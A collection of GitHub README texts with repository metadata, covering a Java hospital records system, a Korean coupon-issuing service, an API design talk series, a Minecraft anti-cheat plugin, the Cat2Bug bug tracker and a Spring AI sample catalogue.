> 
> 登录地址：http://localhost:8080/login.jsp
> 
> 管理员：admin 123456
> 
> 护士：016 123456
> 
> 医生：001 123456
>

## 项目介绍
基于ssm的医院病历管理系统：前端 jsp、ajax，后端 springmvc、spring、mybatis；角色分为管理员、护士、医生；集成病人管理、病历管理、药品管理等功能于一体的系统。

## 功能介绍

- 系统用户管理：管理员账户的增删改查，按用户模糊搜索，密码修改
- 医护人员管理：医生信息的增删改查，护士信息的增删改查
- 病人管理：病人信息的增删改查，多条件查询
- 病历管理：病历信息的增删改查
- 药品管理：药品信息的增删改查，多条件查询，药品图片上传

## 环境

- <b>IntelliJ IDEA 2021.3</b>

- <b>Mysql 5.7.26</b>

- <b>Tomcat 7.0.73</b>

- <b>JDK 1.8</b>

## 运行截图
![](screenshot/1.png)

![](screenshot/2.png)

![](screenshot/3.png)

![](screenshot/4.png)

![](screenshot/5.png)

![](screenshot/6.png)

![](screenshot/7.png)

![](screenshot/8.png)",0,0,1,
efojug/BootFlasher,master,,18,1,1,AGPL-3.0
f-lab-edu/off-coupon,develop,"# off-coupon 프로젝트 개요

<img width=""789"" alt=""image"" src=""https://github.com/f-lab-edu/off-coupon/assets/101460733/d2b9c662-3e0c-44d1-965a-0b1a15b54ac4"">  
<br> 이 프로젝트는 네고왕 선착순 이벤트를 참고하여 개발된 서비스로, 선착순 쿠폰 발행 및 사용 기능을 중점적으로 다루고 있습니다. 

# 프로젝트 목표
- 고가용성 선착순 쿠폰 발행 및 사용 서비스를 구현하는 것이 목표입니다.
- 객체지향 원칙에 준수하며 유지 보수 용이한 코드를 작성하는 것을 목표로 합니다.
- Slice Test를 활용하여 각 모듈의 기능을 단위별로 테스트하는 것이 목표입니다.
- 대규모 트래픽에도 데이터 정합성을 유지하고 서비스 안정성을 보장하는것이 목표입니다.

# Git Flow

✅ master : 릴리스 버전을 관리하는 메인 브랜치  
✅ develop : 개발이 진행되는 통합 브랜치  
✅ feature : 새로운 기능을 개발하는 브랜치  
✅ hotfix : 실제 프로덕션에서 발생한 버그를 수정하는 브랜치  

Reference : [우아한 형제들 기술블로그 : gitFlow](https://techblog.woowahan.com/2553/)

# 프로젝트 기술 스택
- ![Java](https://img.shields.io/badge/Java-17-007396?logo=java)
- ![Spring Boot](https://img.shields.io/badge/Spring%20Boot-3.2.2-6DB33F?logo=spring%20boot&logoColor=6DB33F)
- ![MySQL](https://img.shields.io/badge/MySQL-8.0.32-4479A1?logo=mysql&logoColor=4479A1)
- ![Redis](https://img.shields.io/badge/Redis-7.2.4-DC382D?logo=redis&logoColor=white)
- ![RabbitMQ](https://img.shields.io/badge/RabbitMQ-3.13.0-FF6600?logo=rabbitmq&logoColor=white)
- ![MyBatis](https://img.shields.io/badge/MyBatis-3.0.3-000000?logo=&logoColor=000000)  
- ![Gradle](https://img.shields.io/badge/Gradle-8.5-02303A?logo=gradle&logoColor=02303A)  
- ![JUnit](https://img.shields.io/badge/JUnit-5.8.2-25A162?logo=junit&logoColor=white)
- ![JaCoCo](https://img.shields.io/badge/JaCoCo-_-FF4088?logo=jacoco&logoColor=white)
- ![Docker](https://img.shields.io/badge/Docker-24.0.2-2496ED?logo=docker&logoColor=white)
- ![IntelliJ](https://img.shields.io/badge/IntelliJ-2023.1-000000?logo=intellijidea&logoColor=000000)
- ![JMeter](https://img.shields.io/badge/JMeter-5.6.2-D21717?logo=apache%20jmeter&logoColor=white)
- ![Jenkins](https://img.shields.io/badge/Jenkins-2.449-D24939?logo=jenkins&logoColor=white)
  

# 서비스 아키텍처

<img width=""1021"" alt=""image"" src=""https://github.com/f-lab-edu/off-coupon/assets/101460733/1ccb49c7-91b4-4e28-b6b9-d529f794ee9b"">


## 쿠폰 발행 Flow

![image](https://github.com/f-lab-edu/off-coupon/assets/101460733/14c085a4-caf2-4184-a97d-58061b0a9bb7)
<img width=""1014"" alt=""image"" src=""https://github.com/f-lab-edu/off-coupon/assets/101460733/1a4fb15f-4c49-4098-85c3-669a331359ef"">

## 쿠폰 사용 Flow
![image](https://github.com/f-lab-edu/off-coupon/assets/101460733/ed965692-3a6d-4f69-bd15-9238a1f3cc18)

## 쿼리 최적화

[1000만건의 데이터를 대상으로 쿼리최적화 with. 복합인덱스, 커버링인덱스](https://strong-park.tistory.com/entry/1000%EB%A7%8C%EA%B1%B4%EC%9D%98-%EB%8D%B0%EC%9D%B4%ED%84%B0%EB%A5%BC-%EB%8C%80%EC%83%81%EC%9C%BC%EB%A1%9C-%EC%BF%BC%EB%A6%AC%EC%B5%9C%EC%A0%81%ED%99%94%EB%A5%BC-%EC%A0%81%EC%9A%A9%ED%95%B4%EB%B3%B4%EC%9E%90)  
[쿼리 최적화를 했지만 부족하다면, Parallel Stream을 사용해보자](https://strong-park.tistory.com/entry/%EC%BF%BC%EB%A6%AC-%EC%B5%9C%EC%A0%81%ED%99%94%EB%A5%BC-%ED%96%88%EC%A7%80%EB%A7%8C-%EB%B6%80%EC%A1%B1%ED%95%98%EB%8B%A4%EB%A9%B4-Parallel-Stream%EC%9D%84-%EC%82%AC%EC%9A%A9%ED%95%B4%EB%B3%B4%EC%9E%90)  
## 동시성 테스트
[쿠폰 발급에 대한 동시성 처리 (1) - synchronized, pessimisti Lock, optimistic Lock](https://strong-park.tistory.com/entry/%EC%BF%A0%ED%8F%B0-%EB%B0%9C%EA%B8%89%EC%97%90-%EB%8C%80%ED%95%9C-%EB%8F%99%EC%8B%9C%EC%84%B1-%EC%B2%98%EB%A6%AC-1-synchronized-pessimisti-Lock-optimistic-Lock)  
[쿠폰 발급에 대한 동시성 처리 (2) - MySQL의 NamedLock, Redis의 분산락(Lettuce, Redisson)](https://strong-park.tistory.com/entry/%EC%BF%A0%ED%8F%B0-%EB%B0%9C%EA%B8%89%EC%97%90-%EB%8C%80%ED%95%9C-%EB%8F%99%EC%8B%9C%EC%84%B1-%EC%B2%98%EB%A6%AC-2-MySQL%EC%9D%98-NamedLock-Redis%EC%9D%98-%EB%B6%84%EC%82%B0%EB%9D%BDLettuce-Redisson)

## CICD

[NCP환경에서 Jenkins와 Docker로 CICD Pipeline 구축하기](https://strong-park.tistory.com/entry/NCP%ED%99%98%EA%B2%BD%EC%97%90%EC%84%9C-Jenkins%EC%99%80-Docker%EB%A1%9C-CICD-Pipeline-%EA%B5%AC%EC%B6%95%ED%95%98%EA%B8%B0)  

## 회원가입

[@RequestBody는 어떻게 바인딩 되는걸까? (with. 디버깅 과정)](https://strong-park.tistory.com/entry/RequestBody%EB%8A%94-%EC%96%B4%EB%96%BB%EA%B2%8C-%EB%B0%94%EC%9D%B8%EB%94%A9-%EB%90%98%EB%8A%94%EA%B1%B8%EA%B9%8C-with-%EB%94%94%EB%B2%84%EA%B9%85-%EA%B3%BC%EC%A0%95)  
[Request에 대한 validation과 Exception 처리에 대한 고찰](https://strong-park.tistory.com/entry/%ED%9A%8C%EC%9B%90%EA%B0%80%EC%9E%85-%EC%8B%9C-Request-validation%EA%B3%BC-Exception-%EC%B2%98%EB%A6%AC%EC%97%90-%EB%8C%80%ED%95%9C-%EA%B3%A0%EC%B0%B0)  
[DATETIME vs TIMESTAMP 둘 중 어느것이 더 나을까?](https://strong-park.tistory.com/entry/DATETIME-vs-TIMESTAMP-%EB%91%98-%EC%A4%91-%EC%96%B4%EB%8A%90%EA%B2%83%EC%9D%B4-%EB%8D%94-%EB%82%98%EC%9D%84%EA%B9%8C)  

## 트러블 슈팅
[private 메소드를 테스트하려 했지만, 문제는 테스트 코드 로직이었다.](https://strong-park.tistory.com/entry/%ED%8A%B8%EB%9F%AC%EB%B8%94-%EC%8A%88%ED%8C%85-private-%EB%A9%94%EC%86%8C%EB%93%9C%EB%A5%BC-%ED%85%8C%EC%8A%A4%ED%8A%B8%ED%95%98%EB%A0%A4-%ED%96%88%EC%A7%80%EB%A7%8C-%EB%AC%B8%EC%A0%9C%EB%8A%94-%ED%85%8C%EC%8A%A4%ED%8A%B8-%EC%BD%94%EB%93%9C%EC%98%80%EB%8B%A4)  
[Junit 테스트 중 Lock wait timeout exceeded 에러 발생](https://strong-park.tistory.com/entry/%ED%8A%B8%EB%9F%AC%EB%B8%94-%EC%8A%88%ED%8C%85-Junit-%ED%85%8C%EC%8A%A4%ED%8A%B8%EB%A5%BC-%ED%95%98%EB%8B%A4%EA%B0%80-Lock-wait-timeout-exceeded%EA%B0%80-%EB%96%B4%EB%8B%A4)  
[테스트코드도 코드이므로 합성을 통해 중복을 없애자](https://strong-park.tistory.com/entry/%ED%8A%B8%EB%9F%AC%EB%B8%94-%EC%8A%88%ED%8C%85-%ED%85%8C%EC%8A%A4%ED%8A%B8%EC%BD%94%EB%93%9C%EB%8F%84-%EC%BD%94%EB%93%9C%EC%9D%B4%EB%AF%80%EB%A1%9C-%EC%B6%94%EC%83%81%ED%99%94%EB%A5%BC-%ED%86%B5%ED%95%B4-%EC%A4%91%EB%B3%B5%EC%9D%84-%EC%97%86%EC%95%A0%EC%9E%90)
## Commit Convention

- feat : 새로운 기능 추가  
- fix : 버그 수정  
- docs : 문서 수정  
- style : 코드 포맷팅, 세미콜론 누락, 코드 변경이 없는 경우  
- refactor : 코드 리팩토링  
- test : 테스트 코드, 리팩토링 테스트 코드  
- chore : 빌드 업무 수정, 패키지 매니저 수정  
",0,5,16,
sweelam/api-design-and-management-talk,main,"## In this FAQ you will find the talks overview, and contents that will be covered. You can also watch the videos of the talks on [API Design and Management](https://www.youtube.com/playlist?list=PLgAqrVq84PDcOryFRPZmhXR_FwGauGtyv)

# What are these talks about?
The talks are about API design in the context of microservices architecture and distributed systems, you can learn inside the followings:
1. Course Introduction
2. Understanding APIs
3. API Design Principles
4. RESTful API Design
5. Advanced API Protocols
6. API Documentation and Specification
7. API Security
8. API Testing and Quality Assurance
9. API Management and Lifecycle
10. Conclusion

# What is the language for the talks?
**Arabic with little English for technical idioms**

# Who can watch the talks?
The talks are for anyone who is writing software, this might include software engineers (backend or frontend), devops engineers, and sysadmins.

# Are the talks for any level?
The talks are for all levels from beginners to professionals

# What are the prerequisites to follow up on these talks?
There are no prerequisites, however, [The Microservices talks](https://www.youtube.com/playlist?list=PLgAqrVq84PDdfiDow3YVsgc1q34JD415Z) will add the most value. 

# Is there any practical part of the talks?
The talks focus on the practices.

# Which programming language is used in the talks?
Java, Python, and nodejs

# Where can I find the material?
The presentation is attached in this repo, you can download it ""api-design-and-management.pdf""

# Where can I find the source code examples?
The main source code repo is ? , however we might add more examples that will be shared in video description
",0,0,4,
Bram1903/AntiHealthIndicator,main,"<div align=""center"">
  <h1>AntiHealthIndicator</h1>
  <img alt=""Build"" src=""https://github.com/Bram1903/AntiHealthIndicator/actions/workflows/gradle.yml/badge.svg"">
  <img alt=""CodeQL"" src=""https://github.com/Bram1903/AntiHealthIndicator/actions/workflows/codeql.yml/badge.svg"">
  <img alt=""GitHub Release"" src=""https://img.shields.io/github/release/Bram1903/AntiHealthIndicator.svg"">
  <br>
  <a href=""https://www.spigotmc.org/resources/antihealthindicator.114851/""><img alt=""SpigotMC"" src=""https://img.shields.io/badge/-SpigotMC-blue?style=for-the-badge&logo=SpigotMC""></a>
  <a href=""https://modrinth.com/plugin/antihealthindicator""><img alt=""Modrinth"" src=""https://img.shields.io/badge/-Modrinth-green?style=for-the-badge&logo=Modrinth""></a>
  <br>
  <a href=""https://discord.deathmotion.com""><img alt=""Discord"" src=""https://img.shields.io/badge/-Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white""></a>
</div>

## Overview

The **AntiHealthIndicator** plugin prevents hackers and modders from seeing other players' health. Designed to be
lightweight with minimal server performance impact, it modifies packets directly, making it impossible to bypass. Logic
executes asynchronously to minimize server load. Additional features include hiding durability, enchantments, item stack
amounts, player saturation, absorption, and XP.

### Requires PacketEvents

Ensure the [PacketEvents](https://modrinth.com/plugin/packetevents) library is installed on your server.

## Table of Contents

- [Overview](#overview)
    - [Requires PacketEvents](#requires-packetevents)
- [Showcase](#showcase)
- [Supported Platforms & Versions](#supported-platforms--versions)
- [Spoofers](#spoofers)
- [Commands](#commands)
- [Permission Nodes](#permission-nodes)
- [Installation](#installation)
- [Compiling From Source](#compiling-from-source)
    - [Prerequisites](#prerequisites)
    - [Steps](#steps)
- [Credits](#credits)
- [License](#license)

## Showcase

![Demo](docs/showcase/AntiHealthIndicator.gif)

## Supported Platforms & Versions

| Platform                           | Supported Versions |
|------------------------------------|--------------------|
| Bukkit (Spigot, Paper, Folia etc.) | 1.8.8 - 1.21.1     |
| Velocity                           | Latest Major       |
| BungeeCord (or any forks)          | Latest Major       |
| Sponge                             | Latest Major       |

## Spoofers

The plugin includes various spoofing features:

- Health
- Air Ticks
- Player Absorption
- Player Saturation
- Player XP
- Item Durability
- Item Enchantments
- Item Stack Amount
- World Seed

## Commands

- `/antihealthindicator` or `/ahi` - Main plugin command.

## Permission Nodes

Operators (OPs) have these permissions by default:

- `AntiHealthIndicator.Notify` - Notifies player of updates.
- `AntiHealthIndicator.Bypass` - Prevents receiving spoofed data (if enabled in config).
- `AntiHealthIndicator.Reload` - Grants access to the `/antihealthindicator reload` command.
- `AntiHealthIndicator.Debug` - Receives debug messages if debugging is enabled.

## Installation

1. **Prerequisites**: Install [PacketEvents](https://modrinth.com/plugin/packetevents).
2. **Download**: Get the latest release from
   the [GitHub release page](https://github.com/Bram1903/AntiHealthIndicator/releases/latest).
3. **Installation**: Move the downloaded plugin to your server's plugins directory.
4. **Configuration**: Customize settings in `config.yml`.
5. **Restart**: Restart the server for changes to take effect.

## Compiling From Source

### Prerequisites

- Java Development Kit (JDK) version 21 or higher
- [Git](https://git-scm.com/downloads)

### Steps

1. **Clone the Repository**:
   ```bash
   git clone https://github.com/Bram1903/AntiHealthIndicator.git
   ```

2. **Navigate to Project Directory**:
   ```bash
   cd AntiHealthIndicator
   ```

3. **Compile the Source Code**:
   Use the Gradle wrapper to compile and generate the plugin JAR file:

   <details>
   <summary><strong>Linux / macOS</strong></summary>

   ```bash
   ./gradlew build
   ```
   </details>
   <details>
   <summary><strong>Windows</strong></summary>

   ```cmd
   .\gradlew build
   ```
   </details>

## Credits

Special thanks to:

- **[@Retrooper](https://github.com/retrooper)**: Author of [PacketEvents](https://github.com/retrooper/packetevents).
- **[@Tofaa](https://github.com/Tofaa2)**: Helped design the project infrastructure and logic. Check out
  his [EntityLib](https://github.com/Tofaa2/EntityLib).
- **[@Booky10](https://github.com/booky10)**: Helped with various complex matters.
- **[@Abhigya](https://github.com/AbhigyaKrishna)**: Designed the Gradle Build Chain.

## License

This project is licensed under the [GPL3 License](LICENSE).
",16,1,3,GPL-3.0
cat2bug/cat2bug-platform,master,"<div align=""center""><img src=""readme/images/logo.png"" style=""width: 300px;"" /></div>
<h1 align=""center"" style=""margin: 30px 0 30px; font-weight: bold;"">Cat2Bug-Platform v0.4.2</h1>
<h4 align=""center"">轻量化智能BUG管理平台</h4>

## 平台简介

Cat2Bug-Platform是一套永久免费开源的Bug管理平台，可以完全私有化部署，它利用目前比较流行的AI大数据模型技术作为辅助，快速提升软件管理的质量，我们将毫无保留给个人及团体免费使用。
它的使用人群锁定个人或中小型软件开发团队，Cat2Bug的理念是免去了项目管理中各种重度管理，让个人或团队可以快速上手，把控软件质量。
平台采用JAVA+VUE前后台分离模式开发，支持在各系统平台部署使用。

## 内置功能

1.  团队管理：管理团队中的项目、成员。
2.  项目管理：管理项目中的缺陷、成员。
3.  用例管理：管理测试用例
4.  缺陷管理：管理BUG、需求、任务。
5.  交付物管理：维护项目中的可交付物品。
6.  报告管理：显示团队、项目、测试用例、缺陷、交付物等的相关数据指标。
7.  API管理：用于管理API接口密钥
8.  文档管理：留备项目中所用到的各种文档
9.  通知管理：发送系统业务通知到系统内部、邮件、钉钉等平台中。

## 最新版本更新说明

当前最新版本是0.4.2

* 在测试用例、缺陷、交付物、报告、文档、通知模块新增悬浮菜单;
* 新建缺陷时添加缓存上一次选项功能
* 缺陷中添加excel导入导出功能;
* 添加数据库自动升级功能；
* 修复系统功能BUG;

## 特色

* 开源私有化AI+BUG系统部署;
* 通过AI技术自动生成测试用例并录入到系统，解决费时费力录入用例的痛点;
* 已测试平台为生态中心，衍生多种缺陷监控测试框架，可以一站式解决软件生产运维中的诸多痛点；
* 自主研发报告模版，可轻松、快速、动态的生成项目所需管理及交付文档，较免管理人员编写文档的时间成本;
* 专注于软件的缺陷的跟踪管理，简单直接，即开即用，减少学习成本；

## 在线体验

- 体验账号：demo
- 体验密码：123456

演示地址：[https://www.cat2bug.com:8022](https://www.cat2bug.com:8022)

## 关联产品

| 名称                                                       | 类型       | 说明                                                                |
|----------------------------------------------------------|----------|:------------------------------------------------------------------|
| [Cat2Bug-JUnit](https://gitee.com/cat2bug/cat2bug-junit) | 单元测试框架   | 自动化单元测试框架，目前可以自动扫描Controller接口，随机提供参数测试，并将测试报告提交到Cat2Bug-Platform |
| [Cat2Bug-JLog](https://gitee.com/cat2bug/cat2bug-jlog)   | 错误日志采集框架 | 获取项目中的异常日志，并将日志报告提交到Cat2Bug-Platform                              |

## 系统架构

![系统架构](readme/images/cat2bug-platform-framework.png)

## 技术选型

1. 系统环境

* Java EE 11
* Servlet 3.0
* Apache Maven 3

2. 主框架

* Spring Boot 2.2.x
* Spring Framework 5.2.x
* Spring Security 5.2.x

3. 持久层

* Apache MyBatis 3.5.x
* Hibernate Validation 6.0.x
* Alibaba Druid 1.2.x

4. 视图层

* Vue 2.6.x
* Axios 0.21.x
* Element 2.15.x

## 模块

````
--cat2bug-platform
------|----cat2bug-platform-admin       # 主程序模块
------|----cat2bug-platform-ai          # 人工智能模块
------|----cat2bug-platform-im          # 通讯模块
------|----cat2bug-platform-api         # Open API模块
------|----cat2bug-platform-common      # 通用模块
------|----cat2bug-platform-framework   # 系统框架
------|----cat2bug-platform-generator   # 代码生成
------|----cat2bug-platform-quartz      # 定时任务
------|----cat2bug-platform-system      # 业务模块
------|----cat2bug-platform-ui          # 前端VUE工程
------|----sql                          # 数据库文件
------|----readme                       # 文档
````

## 部署

### 手动命令行部署

手动部署需要提前安装Java 11环境，并下载cat2bug-platform发行版程序，执行命令如下：

```shell
nohup java -jar cat2bug-platform-0.4.2.jar>/dev/null 2>&1 &
```

### Docker单容器部署

以下提供的是Docker官网容器化的部署方案，执行命令如下：

```docker
docker run -it -d -p 8022:8022 --name cat2bug-platform cat2bug/cat2bug-platform:latest
```

由于Docker官网访问不稳定，我们还提供了国内镜像下载的方案：

```docker
docker run -it -d -p 8022:8022 --name cat2bug-platform qyzw-docker.pkg.coding.net/cat2bug/cat2bug-platform/single:latest
```

部署成功后，打开浏览器访问[http://127.0.0.1:8022](http://127.0.0.1:8022),在登陆页面自行注册账号登陆使用即可。

注意：系统管理员账号：admin    密码：cat2bug，此账号用于管理注册用户。

此部署方式为单容器最精简方式部署，数据库默认采用嵌入式H2，多用于小型或临时性项目的缺陷管理，如需Mysql或多容器部署方案，请查看[官网文档](https://www.cat2bug.com/download/cat2bug-platform/#%E9%83%A8%E7%BD%B2)。

## 演示图

<table>
    <tr>
        <td><img src=""readme/images/1.png""></td>
        <td><img src=""readme/images/2.png""></td>
    </tr>
    <tr>
        <td><img src=""readme/images/3.png""></td>
        <td><img src=""readme/images/4.png""></td>
    </tr>
    <tr>
        <td><img src=""readme/images/5.png""></td>
        <td><img src=""readme/images/6.png""></td>
    </tr>
    <tr>
        <td><img src=""readme/images/7.png""></td>
        <td><img src=""readme/images/8.png""></td>
    </tr>
</table>

## 未来计划

目前Cat2Bug还在持续成长中，后续我们将在测试工具、自动化、AI几个方向持续投入，完善平台的功能。2024计划如下：

* cat2bug-platform: 功能叠加，完善系统统计管理功能；
* cat2bug-app：提供移动端APP；
* cat2bug-spring-junit：提供Java Spring自动化单元测试(已完成)；
* cat2bug-cloud：cat2bug云平台的建设；

## Cat2Bug交流群

| QQ群： [731462000](https://qm.qq.com/cgi-bin/qm/qr?k=G_vJa478flcFo_1ohJxNYD0mRKafQ7I1&jump_from=webapi&authKey=EL0KrLpnjYWqNN9YXTVksNlNFrV9DHYyPMx2RVOhXqLzfnmc+Oz8oQ38aBOGx90t) | 微信群：Cat2Bug                                                                 |
|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------|
| <img src=""./readme/images/qq.png"" style=""width: 150px; height: 150px;"">                                                                                                        | <img src=""./readme/images/wechat.png"" style=""width: 150px; height: 150px;""> |
",0,4,1,MIT
ThomasVitale/llm-apps-java-spring-ai,main,"# LLM and AI-Infused Applications with Java and Spring AI

Samples showing how to build Java applications powered by Generative AI and Large Language Models (LLMs) using [Spring AI](https://docs.spring.io/spring-ai/reference/).

## Pre-Requisites

* Java 23
* Docker/Podman

## Content

### 0. Use Cases

| Project                                                                                                                                 | Description                                                                 |
|-----------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------|
| [chatbot](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/00-use-cases/chatbot)                                       | Chatbot using LLMs via Ollama.                                              |
| [question-answering](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/00-use-cases/question-answering)                 | Question answering with documents (RAG) using LLMs via Ollama and PGVector. |
| [semantic-search](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/00-use-cases/semantic-search)                       | Semantic search using LLMs via Ollama and PGVector.                         |
| [structured-data-extraction](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/00-use-cases/structured-data-extraction) | Structured data extraction using LLMs via Ollama.                           |
| [text-classification](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/00-use-cases/text-classification)               | Text classification using LLMs via Ollama.                                  |

### 1. Chat Completion Models

| Project                                                                                                                                           | Description                                       |
|---------------------------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------|
| [chat-models-mistral-ai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/01-chat-models/chat-models-mistral-ai)                 | Text generation with LLMs via Mistral AI.         |
| [chat-models-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/01-chat-models/chat-models-ollama)                         | Text generation with LLMs via Ollama.             |
| [chat-models-openai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/01-chat-models/chat-models-openai)                         | Text generation with LLMs via OpenAI.             |
| [chat-models-multiple-providers](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/01-chat-models/chat-models-multiple-providers) | Text generation with LLMs via multiple providers. |

### 2. Prompts, Messages, and Templates and Multimodality

| Project                                                                                                                                     | Description                                                              |
|---------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------|
| [prompts-basics-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/02-prompts/prompts-basics-ollama)                 | Prompting using simple text with LLMs via Ollama.                        |
| [prompts-basics-openai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/02-prompts/prompts-basics-openai)                 | Prompting using simple text with LLMs via OpenAI.                        |
| [prompts-messages-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/02-prompts/prompts-messages-ollama)             | Prompting using structured messages and roles with LLMs via Ollama.      |
| [prompts-messages-openai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/02-prompts/prompts-messages-openai)             | Prompting using structured messages and roles with LLMs via OpenAI.      |
| [prompts-templates-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/02-prompts/prompts-templates-ollama)           | Prompting using templates with LLMs via Ollama.                          |
| [prompts-templates-openai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/02-prompts/prompts-templates-openai)           | Prompting using templates with LLMs via OpenAI.                          |

### 3. Structured Output

| Project                                                                                                                               | Description                                                                     |
|---------------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------|
| [structured-output-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/03-structured-output/structured-output-ollama) | Converting the LLM output to structured JSON and Java objects via Ollama.       |
| [structured-output-openai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/03-structured-output/structured-output-openai)    | Converting the LLM output to structured JSON and Java objects via Open AI. |

### 4. Multimodality

| Project                                                                                                                                | Description                                                              |
|----------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------|
| [multimodality-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/04-multimodality/multimodality-ollama) | Multimodality to include various media in a prompt with LLMs via Ollama. |
| [multimodality-openai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/04-multimodality/multimodality-openai)      | Multimodality to include various media in a prompt with LLMs via OpenAI. |

### 5. Function Calling

| Project                                                                                                                                          | Description                                |
|--------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------|
| [function-calling-mistral-ai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/05-function-calling/function-calling-mistral-ai) | Function calling with LLMs via Mistral AI. |
| [function-calling-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/05-function-calling/function-calling-ollama)         | Function calling with LLMs via Ollama.     |
| [function-calling-openai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/05-function-calling/function-calling-openai)         | Function calling with LLMs via OpenAI.     |

### 6. Embedding Models

| Project                                                                                                                                              | Description                                                                                     |
|------------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------|
| [embedding-models-mistral-ai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/06-embedding-models/embedding-models-mistral-ai)     | Vector transformation (embeddings) with LLMs via Mistral AI.                                    |
| [embedding-models-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/06-embedding-models/embedding-models-ollama)             | Vector transformation (embeddings) with LLMs via Ollama.                                        |
| [embedding-models-openai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/06-embedding-models/embedding-models-openai)             | Vector transformation (embeddings) with LLMs via OpenAI.                                        |
| [embedding-models-transformers](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/06-embedding-models/embedding-models-transformers) | Vector transformation (embeddings) with LLMs via ONNX Sentence Transformers. |

### 7. Data Ingestion

| Project                                                                                                                                                              | Description                                                                            |
|----------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------|
| [document-readers-json-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/07-data-ingestion/document-readers-json-ollama)                     | Reading and vectorizing JSON documents with LLMs via Ollama.                           |
| [document-readers-markdown-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/07-data-ingestion/document-readers-markdown-ollama)                 | Reading and vectorizing Markdown documents with LLMs via Ollama.                       |
| [document-readers-pdf-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/07-data-ingestion/document-readers-text-ollama)                      | Reading and vectorizing PDF documents with LLMs via Ollama.                            |
| [document-readers-text-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/07-data-ingestion/document-readers-text-ollama)                     | Reading and vectorizing text documents with LLMs via Ollama.                           |
| [document-readers-tika-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/07-data-ingestion/document-readers-tika-ollama)                     | Reading and vectorizing documents with LLMs and Tika via Ollama.                       |
| [document-transformers-metadata-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/07-data-ingestion/document-transformers-metadata-ollama)   | Enrich documents with keywords and summary metadata for enhanced retrieval via Ollama. |
| [document-transformers-splitters-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/07-data-ingestion/document-transformers-splitters-ollama) | Divide documents into chunks to fit the LLM context window via Ollama.                 |

### 8. Vector Stores

_Coming soon_

### 9. Retrieval Augmented Generation (RAG)

| Project                                                                                            | Description                                                                          |
|----------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------|
| [rag-naive](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/09-rag/rag-naive)    | Basic question answering with documents (RAG) using LLMs via Ollama and PGVector.    |
| [rag-advanced](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/09-rag/rag-advanced) | Advanced question answering with documents (RAG) using LLMs via Ollama and PGVector. |

### 10. Memory

_Coming soon_

### 11. Image Models

| Project                                                                                                                      | Description                            |
|------------------------------------------------------------------------------------------------------------------------------|----------------------------------------|
| [image-models-openai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/11-image-models/image-models-openai) | Image generation with LLMs via OpenAI. |

### 12. Audio Models

| Project                                                                                                                                                  | Description                                |
|----------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------|
| [audio-models-speech-openai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/12-audio-models/audio-models-speech-openai)               | Speech generation with LLMs via OpenAI.    |
| [audio-models-transcription-openai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/12-audio-models/audio-models-transcription-openai) | Speech transcription with LLMs via OpenAI. |

### 13. Moderation Models

_Coming soon_

### 14. Observability

| Project                                                                                                                                                         | Description                              |
|-----------------------------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------|
| [observability-models-mistral-ai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/10-observability/observability-models-mistral-ai)            | LLM Observability for Mistral AI.        |
| [observability-models-ollama](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/10-observability/observability-models-ollama)                   | LLM Observability for Ollama.            |
| [observability-models-openai](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/10-observability/observability-models-openai)                   | LLM Observability for OpenAI.            |
